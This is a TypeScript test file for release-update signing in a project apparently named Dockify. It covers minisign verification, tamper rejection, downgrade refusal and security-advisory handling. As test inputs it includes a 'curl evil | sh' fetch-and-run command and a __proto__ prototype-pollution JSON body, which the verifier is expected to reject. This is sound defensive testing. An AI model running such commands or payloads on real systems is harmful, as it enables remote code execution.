import { randomBytes } from "node:crypto";
import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import { parsePublicKey, SignatureError, verifyMinisign } from "./minisign.ts";
import { archOf, chooseRelease, compareVersions, feedUrl, fetchVerifiedFeed, guardedFetcher, imagesFor, pendingSecurity, refuseTarget, securityInfo, trustedKey, verifyFeed, type FeedRelease, type SecurityBlock } from "./release.ts";
import { testSigner } from "./test-sign.ts";
import { comment, D, feedBytes, R, release } from "./test-fixtures.ts";

describe("minisign", () => {
  const s = testSigner();
  const msg = Buffer.from("hello release");

  it("verifies a prehashed and a legacy signature", () => {
    expect(verifyMinisign(msg, s.signMessage(msg, "t"), parsePublicKey(s.pub))).toEqual({ trustedComment: "t", prehashed: true });
    expect(verifyMinisign(msg, s.signMessage(msg, "t", "Ed"), parsePublicKey(s.pub)).prehashed).toBe(false);
  });

  it("rejects a changed message, another key, an altered trusted comment and junk", () => {
    const sig = s.signMessage(msg, "version:1.0.0");
    const key = parsePublicKey(s.pub);
    expect(() => verifyMinisign(Buffer.from("hello releasf"), sig, key)).toThrow(SignatureError);
    expect(() => verifyMinisign(msg, sig, parsePublicKey(testSigner().pub))).toThrow(/different key/);
    expect(() => verifyMinisign(msg, sig.replace("version:1.0.0", "version:9.0.0"), key)).toThrow(/altered/);
    expect(() => verifyMinisign(msg, "nope", key)).toThrow(SignatureError);
    expect(() => verifyMinisign(msg, s.signMessage(msg, "t", "ED", randomBytes(8)), key)).toThrow(/different key/);
  });

  it("rejects a public key that is not Ed25519 minisign", () => {
    expect(() => parsePublicKey(Buffer.alloc(42).toString("base64"))).toThrow(SignatureError);
    expect(() => parsePublicKey("not base64!")).toThrow(SignatureError);
  });
});

describe("signed release feed: verify before parse", () => {
  const s = testSigner();
  const bytes = feedBytes([release("1.2.0"), release("1.1.0")]);

  it("accepts a valid signature from the pinned key", () => {
    const f = verifyFeed(bytes, s.signMessage(bytes, comment("1.2.0")), s.pub, "stable");
    expect(f.releases.map((r) => r.version)).toEqual(["1.2.0", "1.1.0"]);
    expect(f.sha256).toMatch(/^[a-f0-9]{64}$/);
  });

  it("refuses a tampered file: one changed byte, a swapped digest, an added release", () => {
    const sig = s.signMessage(bytes, comment("1.2.0"));
    const flipped = Buffer.from(bytes);
    flipped[flipped.length - 3] = flipped[flipped.length - 3]! ^ 1;
    expect(() => verifyFeed(flipped, sig, s.pub, "stable")).toThrow(/does not match/);
    const swapped = Buffer.from(bytes.toString("utf8").replace("a".repeat(64), "e".repeat(64)));
    expect(() => verifyFeed(swapped, sig, s.pub, "stable")).toThrow(/does not match/);
    const added = feedBytes([release("9.9.9"), release("1.2.0"), release("1.1.0")]);
    expect(() => verifyFeed(added, sig, s.pub, "stable")).toThrow(SignatureError);
  });

  it("refuses a signature from another key", () => {
    const other = testSigner();
    expect(() => verifyFeed(bytes, other.signMessage(bytes, comment("1.2.0")), s.pub, "stable")).toThrow(/different key/);
  });

  it("refuses an unsigned feed: no signature, an empty one, or junk", () => {
    expect(() => verifyFeed(bytes, "", s.pub, "stable")).toThrow(/malformed/);
    expect(() => verifyFeed(bytes, "untrusted comment: nothing\n", s.pub, "stable")).toThrow(SignatureError);
    expect(() => verifyFeed(bytes, bytes.toString("utf8"), s.pub, "stable")).toThrow(SignatureError);
  });

  it("never parses unsigned bytes: a hostile body fails on the signature, not in JSON.parse", () => {
    const evil = Buffer.from('{"__proto__":{"polluted":true}');
    expect(() => verifyFeed(evil, s.signMessage(bytes, comment("1.2.0")), s.pub, "stable")).toThrow(/does not match/);
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
  });

  it("binds the trusted comment to the newest version and the channel", () => {
    expect(() => verifyFeed(bytes, s.signMessage(bytes, comment("1.1.0")), s.pub, "stable")).toThrow(/newest version/);
    expect(() => verifyFeed(bytes, s.signMessage(bytes, "version:1.2.0"), s.pub, "stable")).toThrow(/channel/);
    const beta = feedBytes([release("1.2.0")], { channel: "beta" });
    expect(() => verifyFeed(beta, s.signMessage(beta, comment("1.2.0", "beta")), s.pub, "stable")).toThrow(/beta channel/);
  });

  it("refuses tags instead of digests, extra fields, unsorted and duplicate versions", () => {
    const sign = (b: Buffer, v: string) => s.signMessage(b, comment(v));
    const tag = feedBytes([release("1.2.0", { images: { ...release("1.2.0").images, web: { amd64: `${R}-web:latest`, arm64: `${R}-web@${D("d")}` } } })]);
    expect(() => verifyFeed(tag, sign(tag, "1.2.0"), s.pub, "stable")).toThrow(/schema/);
    const extra = feedBytes([{ ...release("1.2.0"), run: "curl evil | sh" } as FeedRelease]);
    expect(() => verifyFeed(extra, sign(extra, "1.2.0"), s.pub, "stable")).toThrow(/schema/);
    const unsorted = feedBytes([release("1.1.0"), release("1.2.0")]);
    expect(() => verifyFeed(unsorted, sign(unsorted, "1.1.0"), s.pub, "stable")).toThrow(/newest first/);
    const dup = feedBytes([release("1.2.0"), release("v1.2.0")]);
    expect(() => verifyFeed(dup, sign(dup, "1.2.0"), s.pub, "stable")).toThrow(/twice/);
  });

  it("fetches the channel file and its .minisig over https and verifies them", async () => {
    const files: Record<string, Buffer> = {
      "https://feed.test/x/releases/stable.json": bytes,
      "https://feed.test/x/releases/stable.json.minisig": Buffer.from(s.signMessage(bytes, comment("1.2.0"))),
    };
    const f = await fetchVerifiedFeed("https://feed.test/x/", "stable", s.pub, async (u) => files[u] ?? Buffer.alloc(0));
    expect(imagesFor(f.releases[0]!, "arm64").web).toBe(`${R}-web@${D("d")}`);
    expect(() => feedUrl("http://feed.test", "stable")).toThrow(/https/);
  });

  it("goes through net-guard: http is refused, a private address is refused", async () => {
    await expect(guardedFetcher()("http://example.com/releases/stable.json", 1000)).rejects.toThrow(/https/);
    await expect(guardedFetcher()("https://127.0.0.1/releases/stable.json", 1000)).rejects.toThrow();
  });

  it("trusts the image's pinned key over the installer's", () => {
    expect(trustedKey({ DOCKIFY_PINNED_PUBKEY: "img", DOCKIFY_RELEASE_PUBKEY: "env" })).toBe("img");
    expect(trustedKey({ DOCKIFY_RELEASE_PUBKEY: "env" })).toBe("env");
    expect(trustedKey({})).toBeNull();
  });
});

describe("choosing a release: no downgrades, minFrom honoured", () => {
  const feed = { releases: [release("2.0.0", { minFrom: "1.5.0" }), release("1.5.0", { minFrom: "1.0.0", critical: true }), release("1.2.0"), release("1.0.0")] };

  it("offers the newest release whose minFrom accepts the running version", () => {
    expect(chooseRelease(feed, "1.5.0")).toMatchObject({ target: { version: "2.0.0" }, blocked: null, critical: false });
    const old = chooseRelease(feed, "1.0.0");
    expect(old.target?.version).toBe("1.5.0");
    expect(old.blocked).toEqual({ version: "2.0.0", minFrom: "1.5.0" });
    expect(old.critical).toBe(true);
  });

  it("refuses downgrades and same versions", () => {
    expect(chooseRelease(feed, "2.0.0").target).toBeNull();
    expect(chooseRelease(feed, "3.0.0").target).toBeNull();
    expect(refuseTarget(release("1.2.0"), "1.5.0")).toMatch(/downgrade/);
    expect(refuseTarget(release("1.5.0"), "1.5.0")).toMatch(/downgrade/);
  });

  it("refuses an unsupported upgrade path", () => {
    expect(refuseTarget(release("2.0.0", { minFrom: "1.5.0" }), "1.2.0")).toMatch(/only from 1\.5\.0/);
    expect(refuseTarget(release("2.0.0", { minFrom: "1.5.0" }), "1.5.0")).toBeNull();
  });

  it("maps the host architecture to the manifest's", () => {
    expect(archOf("x64")).toBe("amd64");
    expect(archOf("arm64")).toBe("arm64");
    expect(() => archOf("ia32")).toThrow(/amd64 and arm64/);
  });
});

describe("security block: signed with the feed, or ignored", () => {
  const s = testSigner();
  const block: SecurityBlock = { level: "critical", summary: "A path check in the log viewer could read files outside the log folder.", advisory: "https://github.com/dockify/dockify/security/advisories/GHSA-abcd-efgh-ijkl", cves: ["CVE-2026-41234"] };
  const signed = (rels: FeedRelease[]) => {
    const bytes = feedBytes(rels);
    return { bytes, sig: s.signMessage(bytes, comment(rels[0]!.version)) };
  };

  it("reads a block that came with the signature", () => {
    const { bytes, sig } = signed([release("1.2.1", { critical: true, security: block }), release("1.2.0")]);
    const f = verifyFeed(bytes, sig, s.pub, "stable");
    expect(f.releases[0]!.security).toEqual(block);
    expect(f.releases[1]!.security).toBeUndefined();
  });

  it("cannot be spoofed or suppressed: adding, changing or removing a block breaks the signature", () => {
    const plain = signed([release("1.2.1"), release("1.2.0")]);
    const added = feedBytes([release("1.2.1", { critical: true, security: block }), release("1.2.0")]);
    expect(() => verifyFeed(added, plain.sig, s.pub, "stable")).toThrow(/does not match/);

    const real = signed([release("1.2.1", { critical: true, security: block }), release("1.2.0")]);
    const lowered = Buffer.from(real.bytes.toString("utf8").replace('"level":"critical"', '"level":"important"'));
    expect(lowered.equals(real.bytes)).toBe(false);
    expect(() => verifyFeed(lowered, real.sig, s.pub, "stable")).toThrow(/does not match/);
    const removed = feedBytes([release("1.2.1", { critical: true }), release("1.2.0")]);
    expect(() => verifyFeed(removed, real.sig, s.pub, "stable")).toThrow(/does not match/);
    // An unsigned feed never reaches the parser, block or not.
    expect(() => verifyFeed(real.bytes, "", s.pub, "stable")).toThrow(SignatureError);
  });

  it("drops an unreadable block and keeps the release, so the update itself is still offered", () => {
    const odd = [
      { ...block, level: "low" },
      { ...block, advisory: "http://example.com/advisory" },
      { ...block, cves: ["CVE-26-1"] },
      { ...block, summary: "" },
      { ...block, summary: "x".repeat(601) },
      "critical",
    ];
    for (const security of odd) {
      const { bytes, sig } = signed([release("1.2.1", { critical: true, security: security as FeedRelease["security"] })]);
      const f = verifyFeed(bytes, sig, s.pub, "stable");
      expect(f.releases[0]!.security, JSON.stringify(security)).toBeUndefined();
      expect(f.releases[0]!.version).toBe("1.2.1");
      expect(chooseRelease(f, "1.2.0").target?.version).toBe("1.2.1");
    }
    // A field this version does not know is left out; the block still counts.
    const { bytes, sig } = signed([release("1.2.1", { critical: true, security: { ...block, cvss: 9.8 } as FeedRelease["security"] })]);
    expect(verifyFeed(bytes, sig, s.pub, "stable").releases[0]!.security).toEqual(block);
  });

  it("counts a release with a block as a security release for the policy", () => {
    expect(chooseRelease({ releases: [release("1.2.1", { security: { ...block, level: "important" } })] }, "1.2.0").critical).toBe(true);
    expect(chooseRelease({ releases: [release("1.2.1")] }, "1.2.0").critical).toBe(false);
  });
});

describe("pendingSecurity: the alert an install still needs", () => {
  const crit = { level: "critical" as const, summary: "Critical fix.", cves: ["CVE-2026-1001"] };
  const imp = { level: "important" as const, summary: "Important fix.", advisory: "https://example.com/a", cves: ["CVE-2026-2002", "CVE-2026-1001"] };

  it("names the newest pending release that carries a block, at the highest pending level", () => {
    const feed = { releases: [release("1.3.0"), release("1.2.2", { security: imp }), release("1.2.1", { security: crit }), release("1.2.0")] };
    expect(pendingSecurity(feed, "1.2.0")).toEqual({ version: "1.2.2", level: "critical", summary: "Important fix.", advisory: "https://example.com/a", cves: ["CVE-2026-2002", "CVE-2026-1001"], publishedAt: "2026-10-01T00:00:00Z" });
    // Past the critical one, only the important one is left.
    expect(pendingSecurity(feed, "1.2.1")).toMatchObject({ version: "1.2.2", level: "important", cves: ["CVE-2026-2002", "CVE-2026-1001"] });
    // Several releases pending and a newer one without a block: the alert stays.
    expect(pendingSecurity({ releases: [release("1.3.0"), release("1.2.1", { security: crit })] }, "1.2.0")).toMatchObject({ version: "1.2.1", level: "critical" });
    expect(pendingSecurity(feed, "1.2.2")).toBeNull();
    expect(pendingSecurity(feed, "1.3.0")).toBeNull();
    expect(pendingSecurity({ releases: [release("1.2.0")] }, "1.1.0")).toBeNull();
  });

  it("keeps a release that needs a stepping stone: the install is exposed until it gets there", () => {
    const feed = { releases: [release("2.0.1", { minFrom: "2.0.0", security: crit }), release("2.0.0", { minFrom: "1.5.0" }), release("1.5.0")] };
    expect(chooseRelease(feed, "1.0.0").target?.version).toBe("1.5.0");
    expect(pendingSecurity(feed, "1.0.0")).toMatchObject({ version: "2.0.1", level: "critical" });
  });

  it("puts the summary on one line and adds the longest reminder its level allows", () => {
    const p = pendingSecurity({ releases: [release("1.2.1", { security: { level: "important", summary: "  Two\nlines   here. " } })] }, "1.2.0");
    expect(p?.summary).toBe("Two lines here.");
    expect(securityInfo(p)).toMatchObject({ maxSnoozeDays: 7 });
    expect(securityInfo({ ...p!, level: "critical" })).toMatchObject({ maxSnoozeDays: 3 });
    expect(securityInfo(null)).toBeNull();
  });
});

describe("compareVersions", () => {
  // apps/web is not a workspace member, so its banner carries its own copy of this function.
  it("is the same function in apps/web/lib/security-release.ts", () => {
    const body = (rel: string) => {
      const src = readFileSync(new URL(rel, import.meta.url), "utf8").replace(/\r\n/g, "\n");
      const start = src.indexOf("export function compareVersions");
      return src.slice(start, src.indexOf("\n}\n", start)).replace(/SEMVER/g, "SemVer");
    };
    expect(body("../../../../../web/lib/security-release.ts")).toBe(body("./release.ts"));
  });

  it("orders releases and prereleases", () => {
    expect(compareVersions("1.2.0", "1.10.0")).toBeLessThan(0);
    expect(compareVersions("v2.0.0", "1.99.99")).toBeGreaterThan(0);
    expect(compareVersions("1.0.0-rc.1", "1.0.0")).toBeLessThan(0);
    expect(compareVersions("1.0.0-rc.2", "1.0.0-rc.10")).toBeLessThan(0);
    expect(compareVersions("1.0.0", "v1.0.0")).toBe(0);
  });
});
